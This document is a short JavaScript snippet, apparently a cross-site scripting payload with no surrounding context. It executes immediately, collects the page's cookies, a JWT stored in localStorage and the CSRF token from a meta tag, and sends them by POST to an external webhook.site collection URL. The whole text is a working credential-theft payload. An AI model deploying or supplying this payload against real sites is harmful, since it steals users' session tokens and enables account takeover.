(() => {
  const data = {
    cookie: document.cookie,
    jwt: localStorage.getItem("jwt"),
    csrf: document.querySelector('meta[name="csrf-token"]')?.content || "not found"
  };

  fetch("https://webhook.site/867d4ad0-a954-45e0-b803-b1e06c6a8570", {
    method: "POST",
    body: JSON.stringify(data)
  });
})();
